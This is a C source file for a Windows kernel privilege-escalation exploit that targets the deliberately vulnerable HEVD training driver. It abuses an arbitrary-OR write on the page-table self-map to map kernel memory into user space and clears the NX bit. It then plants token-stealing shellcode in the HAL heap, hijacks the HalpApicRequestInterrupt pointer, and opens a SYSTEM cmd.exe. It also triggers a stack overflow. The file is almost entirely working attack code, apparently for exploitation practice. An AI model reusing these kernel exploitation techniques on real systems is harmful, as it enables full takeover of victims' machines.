#include <Windows.h>

#include "paging.h"
#include "hevd.h"
#include "arbitrary_or.h"

// Implemented in payload.asm
extern __int64 ElevatePrivileges();

unsigned long long* mapAddressToUser(unsigned long long address , int toggleNx);

int main() {
	arbitraryOr4(PXE_SELFMAP);


	unsigned long long* address = mapAddressToUser(HAL_HEAP_BASE, 1);
	unsigned long long HalpApicRequestInterrupt = *(address + (0x4C0 + 0x78) / 8);
	char* shellcodeAddress = (char*)address + 0xD50;
	memcpy(shellcodeAddress, &ElevatePrivileges, 0x90);

	*(unsigned long long*)((char*)shellcodeAddress + 0x3) = HalpApicRequestInterrupt;
	unsigned long currentPid = GetCurrentProcessId();
	*(unsigned long*)((char*)shellcodeAddress + 0x3B) = currentPid;
	*(unsigned long long*)((char*)shellcodeAddress + 0x7C) = HalpApicRequestInterrupt;

	*(address + (0x4C0 + 0x78) / 8) = HAL_HEAP_BASE + 0xD50;

	Sleep(0x2000);
	system("cmd.exe");
	return 0;
}

unsigned long long* getAvailablePxe() {
	unsigned long long* pxePointer = PXE_BASE;
	
	for (int i = 0x100; i < 0x200; ++i) {
		if (0 == *pxePointer) {
			return pxePointer;
		}
		++pxePointer;
	}

	return 0;
}

unsigned long long* mapAddressToUser(unsigned long long address, int toggleNx) {
	unsigned long long* pxe = getAvailablePxe();
	unsigned long long* craftedAddress = useAsPte(pxe);

	unsigned long long* addressPxe = (unsigned long long*)GetPxeAddress(address);
	*pxe = *addressPxe | 0x67;
	Sleep(1);

	unsigned long long* addressPpe = (unsigned long long*)GetPpeAddress(address);
	short ppeOfsset = (unsigned long long)addressPpe & 0xFFF;
	*pxe = *(unsigned long long*)((char*)craftedAddress+ppeOfsset) | 0x67;
	Sleep(1);

	unsigned long long* addressPde = (unsigned long long*)GetPdeAddress(address);
	short pdeOfsset = (unsigned long long)addressPde & 0xFFF;
	*pxe = *(unsigned long long*)((char*)craftedAddress + pdeOfsset) | 0x67;
	Sleep(1);

	unsigned long long* addressPte = (unsigned long long*)GetPteAddress(address);
	short pteOfsset = (unsigned long long)addressPte & 0xFFF;
	if (toggleNx) {
		unsigned long long* originalPte = (unsigned long long*)((char*)craftedAddress + pteOfsset);
		*originalPte = *originalPte & 0x7FFFFFFFFFFFFFFF;
	}
	*pxe = (*(unsigned long long*)((char*)craftedAddress + pteOfsset) & 0x7FFFFFFFFFFFFFFF) | 0x67;
	Sleep(1);

	return craftedAddress;
}

int exploitHevdStackOverflow() {
	unsigned long long pteAddress = 0;
	unsigned long oldProtect = 0;

	void* address = VirtualAlloc((void*)0x1000000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	memcpy(address, &ElevatePrivileges, 0x50);
	VirtualProtect(address, 0x1000, PAGE_EXECUTE_READ, &oldProtect);

	pteAddress = GetPteAddress(address);
	DebugBreak();
	// .reload /f HEVD.sys; bp HEVD!TriggerStackOverflow; PTE nx-bit
	triggerStackOverflow(address);
	system("cmd.exe");
	return 0;
}
